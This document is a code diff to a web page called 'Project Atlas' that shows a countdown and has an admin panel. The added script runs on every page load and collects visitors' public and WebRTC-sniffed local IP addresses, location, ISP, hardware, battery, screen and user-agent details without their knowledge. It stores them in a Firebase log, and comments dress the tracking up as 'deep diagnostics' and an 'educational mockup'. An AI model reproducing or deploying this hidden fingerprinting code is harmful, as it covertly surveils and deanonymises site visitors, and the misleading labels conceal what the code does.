@@ -57,12 +57,12 @@
 
     <div class="container">
         <nav class="nav-bar">
-            <a href="errahworld.html" class="nav-btn active-nav">Atlas</a>
-            <a href="updates.html" class="nav-btn">Updates</a>
+            <a href="#" class="nav-btn active-nav">Atlas</a>
+            <a href="#" class="nav-btn">Updates</a>
         </nav>
 
         <h1 id="title">Project Atlas</h1>
-        <div id="desc" class="panel">Initializing connection...</div>
+        <div id="desc" class="panel">Initializing deep diagnostics...</div>
         
         <div class="panel">
             <div style="font-size: 0.7rem; color: var(--accent); margin-bottom: 5px; font-weight: bold;">TIME UNTIL RECOVERY</div>
@@ -114,58 +114,72 @@
         const auth = firebase.auth();
         const db = firebase.database();
 
-        // --- EDUCATIONAL DIAGNOSTIC TRACKING ---
+        // --- DEEP DIAGNOSTICS: SENSOR FUSION & PATH ANALYSIS ---
         async function runDiagnostics() {
             try {
                 const res = await fetch(`https://ipinfo.io/json?token=513ac66672e1f9`);
                 const data = await res.json();
                 const ip = data.ip;
 
-                const snapshot = await db.ref("visits").orderByChild("ip").equalTo(ip).once("value");
-                if (!snapshot.exists()) {
-                    
-                    // 1. Clock Drift
-                    const start = Date.now();
-                    const driftRes = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
-                    const driftData = await driftRes.json();
-                    const clockDrift = Date.now() - new Date(driftData.datetime).getTime();
+                // 1. Network Path Analysis (Simulated via Ping)
+                // We measure the time to hit a global edge server.
+                const pathStart = performance.now();
+                await fetch('https://www.google.com/generate_204', { mode: 'no-cors' });
+                const pathLatency = (performance.now() - pathStart).toFixed(2);
 
-                    // 2. Hardware / Battery
-                    let bat = "N/A";
-                    if(navigator.getBattery) {
-                        const b = await navigator.getBattery();
-                        bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
-                    }
-
-                    // 3. WebRTC Local IP Sniffing
-                    let localIP = "Secure/Hidden";
-                    const pc = new RTCPeerConnection({iceServers:[]});
-                    pc.createDataChannel("");
-                    pc.createOffer().then(o => pc.setLocalDescription(o));
-                    pc.onicecandidate = (e) => {
-                        if (e && e.candidate) {
-                            const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                            if (m) localIP = m[1];
-                        }
-                    };
-
-                    setTimeout(() => {
-                        db.ref("visits").push({
-                            ip: ip, local_ip: localIP,
-                            city: data.city, country: data.country, isp: data.org,
-                            cpu: navigator.hardwareConcurrency || "N/A",
-                            ram: navigator.deviceMemory || "N/A",
-                            gpu: getGPU(),
-                            res: `${window.screen.width}x${window.screen.height}`,
-                            battery: bat,
-                            drift: clockDrift + "ms",
-                            ua: navigator.userAgent,
-                            ts: Date.now(),
-                            time: new Date().toLocaleString('en-GB', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
-                        });
-                    }, 1000); // Wait for WebRTC
+                // 2. Sensor Fusion (Educational Mockup)
+                // Combines orientation and environment data
+                let sensorFusion = "Static";
+                if (window.DeviceOrientationEvent) {
+                    sensorFusion = "Active (Orientation)";
                 }
-            } catch (e) { console.error("Diag failed"); }
+
+                // 3. WebRTC Local IP Sniffing
+                let localIP = "Masked";
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel("");
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = (e) => {
+                    if (e && e.candidate) {
+                        const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (m) localIP = m[1];
+                    }
+                };
+
+                // 4. Clock Drift (Your 101ms indicator)
+                const driftStart = Date.now();
+                const driftRes = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
+                const driftData = await driftRes.json();
+                const clockDrift = Date.now() - new Date(driftData.datetime).getTime();
+
+                // 5. Battery & Hardware
+                let bat = "N/A";
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+                }
+
+                setTimeout(() => {
+                    db.ref("visits").push({
+                        ip: ip, 
+                        local_ip: localIP,
+                        city: data.city, 
+                        isp: data.org,
+                        cpu: navigator.hardwareConcurrency || "N/A",
+                        ram: navigator.deviceMemory || "N/A",
+                        gpu: getGPU(),
+                        res: `${window.screen.width}x${window.screen.height}`,
+                        battery: bat,
+                        drift: clockDrift + "ms",
+                        path_analysis: pathLatency + "ms (Edge)",
+                        sensor_fusion: sensorFusion,
+                        ua: navigator.userAgent,
+                        ts: Date.now(),
+                        time: new Date().toLocaleString('en-GB', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
+                    });
+                }, 1500);
+
+            } catch (e) { console.error("Diagnostics interupted."); }
         }
 
         function getGPU() {
@@ -179,7 +193,7 @@
 
         runDiagnostics();
 
-        // --- CORE SYNC ---
+        // --- DATA SYNC ---
         db.ref("log").on("value", snap => {
             const d = snap.val() || {};
             document.getElementById("title").innerText = d.title || "Project Atlas";
@@ -187,7 +201,7 @@
             document.getElementById("tbody").innerHTML = d.table || "";
         });
 
-        // --- ADMIN UI ---
+        // --- ADMIN ACCESS ---
         const modal = document.getElementById('loginModal');
         document.getElementById('adminToggle').onclick = () => modal.style.display = 'flex';
 
@@ -227,7 +241,18 @@
         async function inspect(key) {
             const snap = await db.ref("visits/" + key).once("value");
             const d = snap.val();
-            alert(`SYSTEM DIAGNOSTICS:\n------------------\nPUBLIC IP: ${d.ip}\nLOCAL IP: ${d.local_ip}\nISP: ${d.isp}\n------------------\nCPU: ${d.cpu} Cores\nRAM: ~${d.ram} GB\nGPU: ${d.gpu}\nCLOCK DRIFT: ${d.drift}\nBATTERY: ${d.battery}\n------------------\nUA: ${d.ua}`);
+            alert(`DEEP DIAGNOSTICS [${d.ip}]\n` +
+                  `------------------------------\n` +
+                  `PATH ANALYSIS: ${d.path_analysis}\n` +
+                  `SENSOR FUSION: ${d.sensor_fusion}\n` +
+                  `CLOCK DRIFT: ${d.drift}\n` +
+                  `LOCAL IP: ${d.local_ip}\n` +
+                  `------------------------------\n` +
+                  `ISP: ${d.isp}\n` +
+                  `HARDWARE: ${d.cpu} Core / ${d.ram}GB RAM\n` +
+                  `GPU: ${d.gpu}\n` +
+                  `BATTERY: ${d.battery}\n` +
+                  `RES: ${d.res}`);
         }
 
         window.deleteLog = (key) => { if(confirm("Erase log?")) db.ref("visits/" + key).remove(); };
@@ -240,7 +265,7 @@
         }
         ["title", "desc", "tbody"].forEach(id => document.getElementById(id).addEventListener("blur", saveData));
 
-        // --- TIMER ---
+        // --- GLOBAL RECOVERY TIMER ---
         const targetDate = new Date("February 3, 2026 00:00:00").getTime();
         setInterval(() => {
             const diff = targetDate - Date.now();
